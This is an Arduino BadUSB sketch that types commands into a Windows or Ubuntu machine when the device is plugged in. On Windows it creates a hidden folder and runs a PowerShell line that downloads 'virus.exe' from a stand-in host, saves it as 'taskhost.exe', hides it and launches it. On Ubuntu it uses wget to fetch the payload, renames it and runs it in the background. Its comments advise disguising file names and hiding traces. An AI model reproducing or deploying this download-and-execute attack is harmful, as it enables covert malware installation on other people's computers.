#define OSX 0
#define WINDOWS 1
#define UBUNTU 2

#include <Keyboard.h>

//change this to switch OS payload
int platform = WINDOWS;

void setup() {
  Keyboard.begin();
  delay(1000);
}

void loop() {
  delay(1000);
  switch (platform) {
    case OSX:
      //TODO
      break;
    case WINDOWS:
      //Windows+r
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      Keyboard.releaseAll();
      delay(100);
      //open cmd console
      Keyboard.print("cmd");
      delay(100);
      Keyboard.write(KEY_RETURN);
      delay(100);
      //set console size to his minimum size, create a hidden directory for your file
      Keyboard.print("MODE 14,1 & mkdir \"C:/ProgramData/WindowsApp\"");
      delay(100);
      Keyboard.write(KEY_RETURN);
      delay(100);
      //download your file and rename it to a common name, hide the file, launch it and exit console (your .exe needs to be console independant)
      Keyboard.print("powershell -command \"$clnt = new-object System.Net.WebClient; $clnt.DownloadFile('http://somewhere.com/virus.exe', 'C:/ProgramData/WindowsApp/taskhost.exe');\" & attrib +h C:/ProgramData/WindowsApp/taskhost.exe & C:/ProgramData/WindowsApp/taskhost.exe & exit");
      delay(100);
      Keyboard.write(KEY_RETURN);
      break;
    case UBUNTU:
      //ctrl+alt+t : new terminal (not working on every Unix)
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press('t');
      Keyboard.releaseAll();
      delay(100);
      //create a hidden directory for your file (.profiles seems quite legit), download it and rename it (try to hide as much as you can) and make it executable, launch it in background and exit terminal
      Keyboard.print("mkdir .profiles && cd .profiles && wget http://somewhere.com/virus.exe && mv virus.exe clean_profile && chmod +x clean_profile && (nohup bash clean_profile &); exit");
      delay(100);
      Keyboard.write(KEY_RETURN);
  }
  //do nothing:
  while (true);
}

